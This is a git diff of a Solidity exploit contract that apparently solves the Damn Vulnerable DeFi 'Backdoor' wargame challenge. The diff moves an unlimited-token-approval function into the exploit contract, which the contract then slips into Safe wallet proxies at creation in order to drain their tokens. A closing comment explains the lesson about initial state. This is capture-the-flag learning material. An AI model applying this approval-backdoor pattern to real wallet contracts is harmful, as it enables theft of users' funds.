@@ -126,7 +126,7 @@ contract BackdoorExploit {
     address recovery;
     uint immutable AMOUNT_TOKENS_DISTRIBUTED;
 
-    MalApprover maliciousApprover;
+    // MalApprover maliciousApprover;
 
     constructor(
         Safe _singletonCopy,
@@ -146,7 +146,7 @@ contract BackdoorExploit {
         recovery = recoveryAddress;
         AMOUNT_TOKENS_DISTRIBUTED = amountTokensDistributed;
 
-        maliciousApprover = new MalApprover();
+        // maliciousApprover = new MalApprover();
     }
 
     function exploit() external {
@@ -156,10 +156,11 @@ contract BackdoorExploit {
             address[] memory owners = new address[](1);
             owners[0] = newOwner;
 
-            address maliciousTo = address(maliciousApprover);
-            bytes memory maliciousData = abi.encodeCall(
-                maliciousApprover.approveTokens,
-                (token, address(this))
+            // address maliciousTo = address(maliciousApprover);
+            bytes memory data = abi.encodeWithSelector(
+                this.approveTokens.selector, // Accesses the 4-byte function identifier
+                token,                       // Parameter 1
+                address(this)                // Parameter 2
             );
 
             bytes memory initializer = abi.encodeCall(
@@ -167,15 +168,15 @@ contract BackdoorExploit {
                 (
                     owners,
                     1,
-                    maliciousTo,
-                    maliciousData,
+                    address(this),
+                    data,
                     address(0),
                     address(0),
                     0,
                     payable(address(0))
                 )
             );
-
+            
             SafeProxy proxy = walletFactory.createProxyWithCallback(
                 address(singletonCopy),
                 initializer,
@@ -192,10 +193,27 @@ contract BackdoorExploit {
 
         token.transfer(recovery, AMOUNT_TOKENS_DISTRIBUTED);
     }
-}
 
-contract MalApprover {
-    function approveTokens(DamnValuableToken token, address spender) external {
-        token.approve(spender, type(uint256).max);
+    function approveTokens(DamnValuableToken  _token, address spender) public {
+        _token.approve(spender, type(uint256).max);
     }
 }
+
+// contract MalApprover {
+//     function approveTokens(DamnValuableToken token, address spender) external {
+//         token.approve(spender, type(uint256).max);
+//     }
+// }
+/**
+ * The system assumed
+“If the Safe ends up owned by Alice, it must be safe.”
+But ownership does NOT mean:
+
+- No hidden approvals
+- No installed modules
+- No pre-granted permissions
+- Ownership only controls future actions.
+- Initialization controls initial state.
+
+And initial state defines future power.
+ */
